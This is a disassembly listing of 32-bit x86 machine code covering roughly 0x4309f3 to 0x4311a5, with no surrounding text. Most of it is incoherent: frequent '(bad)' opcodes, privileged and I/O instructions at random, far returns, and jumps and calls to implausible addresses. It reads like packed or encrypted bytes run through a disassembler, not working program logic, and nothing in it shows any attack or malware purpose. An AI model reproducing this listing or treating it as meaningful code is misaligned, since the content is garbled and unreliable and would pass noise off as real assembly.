  4309f3:	add    esi,DWORD PTR [ebx]
  4309f5:	rdpmc  
  4309f7:	retf   0x5503
  4309fa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a00:	dec    ebp
  430a01:	stc    
  430a02:	mov    ecx,DWORD PTR [eax]
  430a04:	or     BYTE PTR [ebp+0x4d],cl
  430a07:	jmp    0x1370a97
  430a0c:	dec    ebp
  430a0d:	dec    ebp
  430a0e:	(bad)  
  430a0f:	mov    esp,esp
  430a11:	clc    
  430a12:	test   ebx,ecx
  430a14:	clc    
  430a15:	ror    DWORD PTR [ebp-0x2a],cl
  430a18:	mov    esi,ecx
  430a1a:	lock scas eax,DWORD PTR es:[edi]
  430a1c:	inc    ebp
  430a1d:	mov    esi,DWORD PTR [ebx]
  430a1f:	hlt    
  430a20:	pushf  
  430a21:	jge    0x4309ae
  430a23:	sub    esp,esp
  430a25:	cmp    ecx,ebx
  430a27:	ja     0x4309f7
  430a29:	mov    ebp,DWORD PTR [eax-0x58]
  430a2c:	dec    ebp
  430a2d:	xor    ecx,DWORD PTR [di+0x3]
  430a31:	mov    ebp,eax
  430a33:	clc    
  430a34:	push   ebp
  430a35:	retf   
  430a36:	mov    dl,bl
  430a38:	adc    esi,edx
  430a3a:	jb     0x430a0a
  430a3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430a42:	lock jge 0x430a10
  430a45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430a48:	mov    esi,DWORD PTR [edi-0x28]
  430a4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430a52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430a58:	mov    edx,ebx
  430a5a:	lock (bad) 
  430a5c:	ror    esi,cl
  430a5e:	push   ebp
  430a5f:	scas   eax,DWORD PTR es:[edi]
  430a60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430a66:	fwait
  430a67:	sub    esi,DWORD PTR [edx]
  430a69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a70:	xor    esp,DWORD PTR [ebx]
  430a72:	add    ecx,DWORD PTR [ebp-0x18]
  430a75:	mov    edi,DWORD PTR [ebp-0x8]
  430a78:	mov    bl,cl
  430a7a:	cmp    dl,bl
  430a7c:	jb     0x430a4c
  430a7e:	add    dh,dl
  430a80:	dec    ebp
  430a81:	scas   eax,DWORD PTR es:[edi]
  430a82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430a88:	shr    DWORD PTR [ebx],cl
  430a8a:	into   
  430a8b:	cmp    edx,esi
  430a8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430a93:	dec    ebp
  430a94:	dec    ebp
  430a95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430a9b:	retf   
  430a9c:	xor    edx,esi
  430a9e:	add    ecx,esi
  430aa0:	imul   ecx,edx
  430aa3:	mov    DWORD PTR [ebp+0x8],edx
  430aa6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430aa9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430aaf:	add    esi,DWORD PTR [ebx]
  430ab1:	rol    BYTE PTR [ebx],0x45
  430ab4:	rdtsc  
  430ab6:	xlat   BYTE PTR ds:[ebx]
  430ab7:	pushf  
  430ab8:	jge    0x430a43
  430aba:	xor    ebx,eax
  430abc:	sub    eax,DWORD PTR [ebp-0x73]
  430abf:	(bad)  
  430ac0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430ac7:	dec    ebp
  430ac8:	xchg   BYTE PTR [ebx],dh
  430aca:	inc    DWORD PTR [ebx]
  430acc:	(bad)  
  430acd:	jmp    0x430b1c
  430acf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430ad5:	dec    ebp
  430ad6:	into   
  430ad7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430add:	fwait
  430ade:	shl    DWORD PTR [edx],cl
  430ae0:	retf   0x5588
  430ae3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430ae9:	add    eax,DWORD PTR [eax]
  430aeb:	call   0x8ace603d
  430af0:	fcom   QWORD PTR [ecx]
  430af2:	retf   
  430af3:	jb     0x430b5a
  430af5:	add    ch,cl
  430af7:	dec    ebp
  430af8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430afe:	dec    ebp
  430aff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b05:	jge    0x430ad5
  430b07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b0d:	add    cl,dh
  430b0f:	dec    ebp
  430b10:	dec    DWORD PTR [ebx-0x2c031b01]
  430b16:	inc    ebp
  430b17:	push   ebp
  430b18:	dec    DWORD PTR [ebx-0x73ff2734]
  430b1e:	lea    ebx,[ebx-0x7400cdac]
  430b24:	push   eax
  430b25:	mov    ah,0x45
  430b27:	push   ebp
  430b28:	mov    esi,DWORD PTR [ebx]
  430b2a:	les    esi,FWORD PTR [ebx]
  430b2c:	add    BYTE PTR [ebx],al
  430b2e:	inc    DWORD PTR [ebx]
  430b30:	mov    ecx,DWORD PTR [edi]
  430b32:	cld    
  430b33:	retf   0x4d80
  430b36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430b3c:	jne    0x430ac9
  430b3e:	jmp    eax
  430b40:	ror    bl,1
  430b42:	or     cl,dh
  430b44:	add    BYTE PTR [edi-0xf2f7475],ch
  430b4a:	not    bl
  430b4c:	adc    al,0xca
  430b4e:	inc    ebp
  430b4f:	push   ebp
  430b50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430b56:	push   0xaf80d6
  430b5b:	mov    eax,DWORD PTR [eax]
  430b5d:	in     al,0xff
  430b5f:	sti    
  430b60:	sbb    dh,cl
  430b62:	pop    esi
  430b63:	xchg   esp,eax
  430b64:	leave  
  430b65:	fwait
  430b66:	add    al,0x32
  430b68:	push   ebp
  430b69:	cmp    ebp,esp
  430b6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430b6f:	dec    DWORD PTR [ecx-0x740f0375]
  430b75:	push   ebp
  430b76:	cld    
  430b77:	xor    ebp,ebx
  430b79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430b7f:	push   ebp
  430b80:	clc    
  430b81:	xor    esi,ecx
  430b83:	add    esi,DWORD PTR [ebp-0x75]
  430b86:	(bad)  
  430b87:	hlt    
  430b88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430b8f:	mov    DWORD PTR [esi],eax
  430b91:	hlt    
  430b92:	(bad)  
  430b93:	dec    ebp
  430b94:	add    esi,DWORD PTR [ebx]
  430b96:	(bad)  
  430b97:	mov    edx,0xffc68d0a
  430b9c:	add    dl,cl
  430b9e:	leave  
  430b9f:	push   ebp
  430ba0:	push   ebp
  430ba1:	mov    ebp,esp
  430ba3:	fcom   QWORD PTR [ecx+0x7d]
  430ba6:	inc    ebp
  430ba7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430bad:	iret   
  430bae:	cld    
  430baf:	retf   0x868f
  430bb2:	loopne 0x430bb1
  430bb4:	mov    edi,edi
  430bb6:	mov    esi,DWORD PTR [ebp-0x8]
  430bb9:	mov    esi,eax
  430bbb:	cld    
  430bbc:	jne    0x430b6e
  430bbe:	mov    BYTE PTR [ecx],0xa
  430bc1:	add    dh,al
  430bc3:	test   DWORD PTR [eax],ecx
  430bc5:	inc    esi
  430bc7:	inc    DWORD PTR [edi]
  430bc9:	mov    eax,esi
  430bcb:	cld    
  430bcc:	add    DWORD PTR [eax+0x901c6],eax
  430bd2:	leave  
  430bd3:	xor    BYTE PTR [ebp+0x45],dl
  430bd6:	in     al,dx
  430bd7:	mov    edx,DWORD PTR [ecx-0x40]
  430bda:	inc    ebp
  430bdb:	add    BYTE PTR [ecx-0x74000301],cl
  430be1:	int3   
  430be2:	cld    
  430be3:	jne    0x430b9d
  430be5:	call   0xcc1ef0
  430bea:	mov    esi,DWORD PTR [ebp-0x8]
  430bed:	test   eax,esi
  430bef:	je     0x430c66
  430bf1:	mov    eax,esi
  430bf3:	cld    
  430bf4:	add    al,0x80
  430bf6:	add    WORD PTR [ecx+0x0],ax
  430bfa:	fiadd  DWORD PTR [eax]
  430bfc:	mov    BYTE PTR [eax],0x3d
  430bff:	push   0xffffffc3
  430c01:	push   esi
  430c02:	mov    edx,DWORD PTR [eax+0x51]
  430c05:	pop    edi
  430c06:	lea    ebx,[ebx-0x8]
  430c09:	ret    0x45
  430c0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c12:	xchg   eax,edi
  430c14:	mov    DWORD PTR [ebp-0x75],ecx
  430c17:	push   esi
  430c18:	clc    
  430c19:	jne    0x430beb
  430c1b:	mov    ecx,0xf8450b0b
  430c20:	(bad)  
  430c21:	push   cs
  430c22:	or     BYTE PTR [ebp-0x3a],dh
  430c25:	cmp    eax,DWORD PTR [ecx]
  430c27:	pop    esi
  430c28:	(bad)  
  430c29:	or     al,0x5
  430c2b:	inc    eax
  430c2c:	leave  
  430c2d:	jmp    0x40cf:0x25564204
  430c34:	leave  
  430c35:	in     eax,dx
  430c36:	inc    DWORD PTR [eax-0x75]
  430c39:	fimul  DWORD PTR [ebx-0x228139be]
  430c3f:	inc    eax
  430c40:	nop
  430c41:	loopne 0x430c42
  430c43:	ret    
  430c44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c4a:	add    eax,0xff45e8f8
  430c4f:	push   esi
  430c50:	push   DWORD PTR [ebp-0x39]
  430c53:	mov    eax,0x7edda46
  430c58:	or     al,0x6
  430c5a:	push   DWORD PTR [ebp-0x3a]
  430c5d:	cmp    eax,DWORD PTR [edx]
  430c5f:	pop    esi
  430c60:	ret    
  430c61:	or     al,0x56
  430c63:	inc    ecx
  430c64:	push   ebp
  430c65:	jle    0x430c53
  430c67:	inc    edx
  430c68:	inc    ebp
  430c69:	int    0x1
  430c6b:	inc    ecx
  430c6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430c72:	add    DWORD PTR [edx+0x1c],eax
  430c75:	retf   0xc38b
  430c78:	adc    al,0x8b
  430c7a:	xchg   edx,eax
  430c7b:	push   ecx
  430c7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c82:	rcl    DWORD PTR [esi-0x9],cl
  430c85:	jne    0x430cd7
  430c87:	mov    eax,0x7c80ece
  430c8c:	rol    DWORD PTR [esi],cl
  430c8e:	div    DWORD PTR [ebp+0x50]
  430c91:	cmp    ecx,edx
  430c93:	pop    esi
  430c94:	dec    BYTE PTR [edx]
  430c96:	in     al,dx
  430c97:	inc    edx
  430c98:	sub    esp,ecx
  430c9a:	inc    eax
  430c9b:	(bad)  
  430c9c:	push   eax
  430c9d:	add    edx,DWORD PTR [eax-0x1f]
  430ca0:	push   edi
  430ca1:	add    dh,dh
  430ca3:	leave  
  430ca4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430ca8:	add    BYTE PTR [ecx+0x0],dl
  430cab:	inc    ebp
  430cac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cb2:	add    BYTE PTR [eax-0x7fbf448],bh
  430cb8:	add    al,0x2
  430cba:	jmp    0x57eb814
  430cbf:	jne    0x430ca9
  430cc1:	mov    eax,DWORD PTR [edx]
  430cc3:	or     BYTE PTR [eax],al
  430cc5:	inc    ecx
  430cc6:	stc    
  430cc7:	in     eax,dx
  430cc8:	ss inc eax
  430cca:	aas    
  430ccb:	out    0x7d,eax
  430ccd:	inc    ecx
  430cce:	mov    ebp,ecx
  430cd0:	lock ret 0x7d
  430cd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430cda:	add    bh,bh
  430cdc:	aad    0xd7
  430cde:	add    dh,cl
  430ce0:	clts   
  430ce2:	(bad)  
  430ce3:	call   0xffce0be8
  430ce8:	hlt    
  430ce9:	iret   
  430cea:	jge    0x430cc2
  430cec:	rol    DWORD PTR [esi-0x80],cl
  430cef:	jmp    0x1c5bfc
  430cf4:	out    dx,al
  430cf5:	mov    eax,DWORD PTR [ebx]
  430cf7:	(bad)  
  430cf8:	pop    esi
  430cf9:	push   es
  430cfa:	cmp    al,0xe8
  430cfc:	sar    edi,0x8
  430cff:	inc    DWORD PTR [edi]
  430d01:	inc    esi
  430d02:	(bad)  
  430d03:	loopne 0x430d83
  430d05:	push   edi
  430d06:	push   cs
  430d07:	push   ebx
  430d08:	add    BYTE PTR [ebx+0x24008b56],cl
  430d0e:	add    BYTE PTR [ebp+0x50],al
  430d11:	push   eax
  430d12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d18:	sub    edx,DWORD PTR [esi-0x24]
  430d1b:	jne    0x430cd3
  430d1d:	lods   eax,DWORD PTR ds:[esi]
  430d1e:	mov    edx,DWORD PTR [edx-0x34]
  430d21:	dec    esi
  430d22:	out    0x83,eax
  430d24:	into   
  430d25:	push   edi
  430d27:	loopne 0x430cf7
  430d29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d34:	rol    DWORD PTR [edx],0x8
  430d37:	mov    esp,ecx
  430d39:	cmp    DWORD PTR [ebx],0xc
  430d3c:	mov    esi,0x5001c0
  430d41:	push   eax
  430d42:	push   cs
  430d43:	push   eax
  430d44:	(bad)  
  430d45:	sub    edx,edi
  430d47:	push   esi
  430d48:	adc    al,0xcb
  430d4a:	ins    DWORD PTR es:[edi],dx
  430d4b:	mov    eax,0x203e8
  430d50:	add    al,ah
  430d52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d59:	add    dh,al
  430d5b:	add    ah,ch
  430d5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d63:	pop    ecx
  430d64:	or     eax,ebx
  430d66:	cli    
  430d67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d6d:	lea    ebp,[ebx]
  430d6f:	mov    edx,DWORD PTR [edx-0x4]
  430d72:	dec    ecx
  430d73:	inc    ebp
  430d74:	shr    BYTE PTR [ebx],0x4b
  430d77:	and    al,0x0
  430d79:	(bad)  
  430d7a:	jne    0x430dc1
  430d7c:	pop    eax
  430d7d:	mov    al,0x5a
  430d7f:	call   0x1420fde
  430d84:	and    al,0x85
  430d86:	push   edx
  430d87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d8b:	dec    ebp
  430d8c:	mov    cl,0x23
  430d8e:	jmp    0x430d7c
  430d90:	mov    al,0xe7
  430d92:	call   0x1391080
  430d97:	shr    DWORD PTR [eax+ebx*2],cl
  430d9a:	lock (bad) 
  430d9c:	adc    eax,0x757f008d
  430da1:	out    0x58,eax
  430da3:	cmp    al,0x7
  430da5:	pop    edx
  430da6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dad:	push   ecx
  430dae:	cld    
  430daf:	mov    esi,0x3b0175
  430db4:	and    al,0xb0
  430db6:	xor    BYTE PTR [edx+0x1],0x8b
  430dba:	add    ah,bh
  430dbc:	mov    edi,DWORD PTR [ebp-0x4]
  430dbf:	psubsw mm7,QWORD PTR [edi]
  430dc2:	add    DWORD PTR [ebp+0x0],ebp
  430dc5:	rcr    eax,1
  430dc7:	mov    edi,ecx
  430dc9:	and    eax,DWORD PTR [eax]
  430dcb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430dd1:	call   0x13010ba
  430dd6:	add    al,cl
  430dd8:	mov    ebp,esi
  430dda:	aam    0x83
  430ddc:	or     DWORD PTR [ecx],eax
  430dde:	jne    0x430dd1
  430de0:	mov    eax,DWORD PTR [eax]
  430de2:	aam    0x0
  430de4:	dec    ebp
  430de5:	jne    0x430d72
  430de7:	cmp    ebx,eax
  430de9:	jb     0x430e38
  430deb:	jmp    0x430d78
  430ded:	mov    ebx,esp
  430def:	int3   
  430df0:	dec    ebp
  430df1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430df8:	mov    edx,0x8b0a8b
  430dfd:	cmp    ecx,DWORD PTR [eax]
  430dff:	jb     0x430dd8
  430e01:	pop    edx
  430e02:	push   edi
  430e03:	cli    
  430e04:	pop    es
  430e05:	mov    eax,ecx
  430e07:	jb     0x430e0b
  430e09:	add    DWORD PTR [ebx],0xa
  430e0c:	mov    eax,DWORD PTR [ebx]
  430e0e:	int3   
  430e0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e15:	jmp    0x430da2
  430e17:	mov    al,0xe8
  430e19:	call   0x104109b
  430e1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e21:	pop    edi
  430e22:	or     BYTE PTR [ecx-0x73],bl
  430e25:	pop    ecx
  430e26:	inc    edi
  430e27:	xor    al,0xeb
  430e29:	push   ecx
  430e2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e30:	call   0xb20f35
  430e35:	int3   
  430e36:	sbb    BYTE PTR [esi],ch
  430e38:	inc    ebp
  430e39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e3f:	call   0x9c10ae
  430e44:	or     BYTE PTR [ebx-0x73],dl
  430e47:	cmp    al,0x47
  430e49:	mov    al,0x1
  430e4b:	jb     0x430e4d
  430e4d:	mov    al,0x10
  430e4f:	push   eax
  430e50:	add    al,0x75
  430e52:	add    BYTE PTR [ebx],ch
  430e54:	add    ebx,esp
  430e56:	int3   
  430e57:	jne    0x430e69
  430e59:	movsx  edx,cl
  430e5c:	add    DWORD PTR [eax],eax
  430e5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e65:	mov    gs,edi
  430e67:	add    BYTE PTR [eax-0x50],ch
  430e6a:	add    al,ch
  430e6c:	mov    eax,DWORD PTR [ecx]
  430e6e:	sub    eax,DWORD PTR [eax]
  430e70:	jb     0x430ee7
  430e72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e76:	jge    0x430e60
  430e78:	add    al,0x1
  430e7a:	add    DWORD PTR [eax],0x0
  430e7d:	jne    0x430e7f
  430e7f:	je     0x430ec6
  430e81:	mov    eax,DWORD PTR [edi]
  430e83:	ror    BYTE PTR [ebp+0x4d],1
  430e86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430e8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430e93:	mov    DWORD PTR [ebx],ebp
  430e95:	fadd   DWORD PTR [eax+0x75]
  430e98:	inc    eax
  430e99:	pop    eax
  430e9a:	lea    ebx,[ecx+0x4f]
  430e9d:	push   0xb1000003
  430ea2:	out    dx,eax
  430ea3:	add    ebp,DWORD PTR [edx+edx*2]
  430ea6:	add    BYTE PTR [ebx+ecx*4],bh
  430ea9:	mov    ch,BYTE PTR [ebx]
  430eab:	jb     0x430f1f
  430ead:	add    al,0x89
  430eaf:	push   eax
  430eb0:	call   0x842b5c22
  430eb5:	add    DWORD PTR [eax+eax*1],eax
  430eb8:	jae    0x430ece
  430eba:	icebp  
  430ebb:	inc    ebp
  430ebc:	mov    eax,DWORD PTR gs:[ecx]
  430ebf:	int3   
  430ec0:	out    dx,al
  430ec1:	loopne 0x430f10
  430ec3:	sub    eax,DWORD PTR [edx]
  430ec5:	push   0xffffff83
  430ec7:	pop    esi
  430ec8:	push   cs
  430ec9:	jl     0x430ee4
  430ecb:	add    al,0xaf
  430ecd:	xor    eax,0x832b6d00
  430ed2:	mov    eax,DWORD PTR [edx]
  430ed4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ee0:	inc    ebp
  430ee1:	shr    ebx,0x3
  430ee4:	or     DWORD PTR [eax],0x4
  430ee7:	push   0xffffffa5
  430ee9:	pop    esi
  430eea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ef1:	jmp    0x430f50
  430ef3:	mov    edi,0xff0272
  430ef8:	fdivr  QWORD PTR [ebp+0x5d]
  430efb:	push   0x4e
  430efd:	pop    ecx
  430efe:	call   0x435303
  430f03:	mov    DWORD PTR [ebx],eax
  430f05:	in     al,0xc8
  430f07:	rol    BYTE PTR [ebp-0x75],0xc1
  430f0b:	call   0xad10ec
  430f10:	pop    esi
  430f11:	enter  0xceff,0x8b
  430f15:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f19:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f20:	je     0x430f22
  430f22:	or     DWORD PTR [ebx-0x74183b24],eax
  430f28:	jne    0x430f0e
  430f2a:	jmp    0x430f25
  430f2c:	push   DWORD PTR [edx-0x24]
  430f2f:	push   0x4d
  430f31:	pop    ecx
  430f32:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f36:	jge    0x430f3e
  430f38:	mov    eax,eax
  430f3a:	sub    ebp,DWORD PTR [edx+0x24]
  430f3d:	pop    esi
  430f3e:	inc    ebp
  430f3f:	mov    esp,0x8b6077
  430f44:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f4a:	lods   al,BYTE PTR ds:[esi]
  430f4b:	add    BYTE PTR [ebx],bh
  430f4d:	enter  0xce73,0x49
  430f51:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f59:	stc    
  430f5a:	jge    0x430fce
  430f5c:	jnp    0xdd4292cb
  430f62:	call   0xc61038
  430f67:	fadd   st(0),st
  430f69:	dec    esi
  430f6a:	ins    BYTE PTR es:[edi],dx
  430f6b:	stc    
  430f6c:	cmp    al,0x73
  430f6e:	push   ebp
  430f6f:	mov    eax,0xf8028b
  430f74:	jne    0x430f37
  430f76:	mov    esi,ecx
  430f78:	mov    esp,DWORD PTR [ebp+0x2c]
  430f7b:	add    edi,DWORD PTR [ebp-0x24]
  430f7e:	sub    esp,eax
  430f80:	and    al,0x45
  430f82:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f88:	sbb    al,0xee
  430f8a:	pop    esi
  430f8b:	call   0x830fbb
  430f90:	fsubr  st,st(3)
  430f92:	sti    
  430f93:	add    BYTE PTR gs:[ecx],bh
  430f96:	add    eax,esp
  430f98:	add    DWORD PTR [esi],eax
  430f9a:	rol    DWORD PTR [ebp+0x8],0x29
  430f9e:	mov    esp,eax
  430fa0:	clc    
  430fa1:	jne    0x431018
  430fa3:	mov    eax,0x8b0673
  430fa8:	loopne 0x430fef
  430faa:	loopne 0x430f35
  430fac:	lods   al,BYTE PTR ds:[esi]
  430fad:	int3   
  430fae:	inc    ebp
  430faf:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fb3:	add    al,0xc3
  430fb5:	sub    ecx,DWORD PTR [ebp+0x47]
  430fb8:	(bad)  
  430fba:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fbe:	add    eax,DWORD PTR [eax]
  430fc0:	call   0x644d0c5
  430fc5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fcb:	dec    esi
  430fcc:	ins    DWORD PTR es:[edi],dx
  430fcd:	in     al,dx
  430fce:	lea    eax,[eax]
  430fd0:	inc    ebp
  430fd1:	inc    ebp
  430fd2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fd8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430fe2:	and    al,0xdc
  430fe4:	ror    DWORD PTR [edx+0x24],0xf7
  430fe8:	or     BYTE PTR [ebp+0x4c],dh
  430feb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430fef:	stos   BYTE PTR es:[edi],al
  430ff0:	adc    edx,edi
  430ff2:	inc    esp
  430ff3:	add    edi,DWORD PTR [eax]
  430ff5:	jne    0x430fda
  430ff7:	mov    DWORD PTR [eax-0x7449db04],ecx
  430ffd:	cmp    ecx,DWORD PTR [edi]
  430fff:	sub    BYTE PTR [ebp-0x7e],dl
  431002:	sar    ebp,0xb
  431005:	jmp    FWORD PTR [edi+0x2400392a]
  43100b:	sub    esi,DWORD PTR [ebx-0x73]
  43100e:	mov    esp,DWORD PTR [ecx+edi*4]
  431011:	mov    ecx,DWORD PTR [eax]
  431013:	and    BYTE PTR [eax],al
  431015:	jne    0x430fe1
  431017:	sub    ebp,ecx
  431019:	sbb    BYTE PTR [esi+0x32],ah
  43101c:	dec    ebp
  43101d:	push   ebp
  43101e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431024:	ret    
  431025:	mov    edx,ebp
  431027:	leave  
  431028:	sub    DWORD PTR [esi+0x24],ebx
  43102b:	ret    0x2b
  43102e:	pop    ax
  431030:	push   ebp
  431031:	rol    BYTE PTR [ebx],0xeb
  431034:	add    DWORD PTR [ecx+0x6c0001],0x40
  43103b:	jb     0x431092
  43103d:	ret    
  43103e:	in     al,dx
  43103f:	jecxz  0x430fcc
  431041:	push   esi
  431042:	xchg   esp,eax
  431043:	jne    0x431045
  431045:	cmp    edx,DWORD PTR [esi+0x1c]
  431048:	jne    0x43102e
  43104a:	mov    eax,DWORD PTR [ebp-0x77]
  43104d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431054:	mov    esi,DWORD PTR [ebp-0x75]
  431057:	pop    esi
  431058:	nop
  431059:	mov    eax,DWORD PTR [eax]
  43105b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431061:	add    al,0x0
  431063:	inc    ebp
  431064:	mov    eax,DWORD PTR [ebx]
  431066:	mov    ebp,ebx
  431068:	cmp    al,0xf
  43106a:	or     al,al
  43106c:	inc    ebp
  43106d:	inc    ebp
  43106e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431074:	cld    
  431075:	add    BYTE PTR [edi+0x546c16c0],dh
  43107b:	add    BYTE PTR [ecx-0x5],dl
  43107e:	add    eax,0x17200
  431083:	sbb    al,0x85
  431085:	dec    esp
  431086:	je     0x4310c0
  431088:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43108c:	add    BYTE PTR [ebx],bh
  43108e:	(bad)  
  43108f:	and    al,0x32
  431091:	jae    0x43102f
  431093:	mov    cl,cl
  431095:	inc    DWORD PTR [esp]
  431098:	push   ebp
  431099:	shr    esp,0x8
  43109c:	in     al,dx
  43109d:	push   esp
  43109e:	add    DWORD PTR [eax],esp
  4310a0:	add    bl,cl
  4310a2:	inc    ebp
  4310a3:	mov    bh,0x89
  4310a5:	add    ah,bh
  4310a7:	jmp    0xca751ff1
  4310ac:	pushf  
  4310ad:	dec    esp
  4310ae:	mov    edx,0xf8178520
  4310b3:	fst    DWORD PTR [ebp+0x0]
  4310b6:	mov    BYTE PTR [eax],0xc4
  4310b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4310bc:	inc    ebp
  4310bd:	add    eax,0xc601da
  4310c2:	mov    al,0xc6
  4310c5:	ins    BYTE PTR es:[edi],dx
  4310c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310cd:	dec    esp
  4310ce:	jmp    DWORD PTR [eax]
  4310d0:	inc    ebp
  4310d1:	fnstcw WORD PTR [esi+0x29]
  4310d4:	test   BYTE PTR [eax],0xc8
  4310d7:	rol    BYTE PTR [eax],0xc0
  4310da:	lea    ecx,[ebp-0x3cf0dbcb]
  4310e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310e6:	inc    esi
  4310e7:	add    DWORD PTR [eax],ebx
  4310e9:	add    dh,bh
  4310eb:	mov    esi,DWORD PTR [edx+0x8]
  4310ee:	(bad)  
  4310ef:	fdiv   QWORD PTR ss:[ecx]
  4310f2:	(bad)  
  4310f3:	mov    bl,ch
  4310f5:	add    esi,eax
  4310f7:	add    dh,bl
  4310f9:	or     esi,eax
  4310fb:	mov    dl,0xdf
  4310fd:	add    esi,eax
  4310ff:	add    al,ah
  431101:	push   cs
  431102:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431109:	or     BYTE PTR [ebx],dh
  43110b:	dec    ecx
  43110c:	lea    eax,[ebx]
  43110e:	xor    eax,0x18fc0fc7
  431113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431114:	repz clc 
  431116:	add    eax,DWORD PTR [ebp+0x46]
  431119:	prefetcht0 BYTE PTR [ecx-0x2]
  43111d:	xor    eax,0x7c60872
  431122:	mov    esp,0xbd32c69b
  431127:	pop    esi
  431128:	mov    cl,0xbe
  43112b:	or     al,0xc6
  43112d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431134:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43113b:	add    dh,al
  43113d:	mov    eax,ebx
  43113f:	xor    DWORD PTR [ebx],0x35008dbc
  431145:	mov    ecx,DWORD PTR [edi]
  431147:	sbb    al,0x18
  431149:	inc    ebp
  43114a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431151:	clc    
  431152:	(bad)  
  431153:	xor    DWORD PTR [edx-0x64],esi
  431156:	lea    ecx,[ecx+0x45ffe838]
  43115c:	mov    ecx,ebx
  43115e:	fadd   st,st(6)
  431160:	dec    ebp
  431161:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431167:	out    0x1,eax
  431169:	inc    ebp
  43116a:	lea    ebp,ds:0xc8ffc6ff
  431170:	enter  0xa33,0xc6
  431174:	push   ebp
  431175:	leave  
  431176:	(bad)  
  431177:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43117d:	add    BYTE PTR [ebp+0x44],al
  431180:	mov    eax,esp
  431182:	mov    WORD PTR [esi+0x46398300],?
  431188:	psubusw mm4,QWORD PTR [esi-0x78]
  43118c:	add    BYTE PTR [ebx-0x1303f975],al
  431192:	add    BYTE PTR [ebp+0x1],0xeb
  431196:	add    BYTE PTR [ebp+0x38],al
  431199:	in     eax,dx
  43119a:	inc    ebp
  43119b:	inc    ebp
  43119c:	mov    ebx,ebx
  43119e:	add    BYTE PTR [ebp+0x0],0xec
  4311a2:	mov    DWORD PTR [ebp-0x41],eax
  4311a5:	sub    eax,0x2c00454e
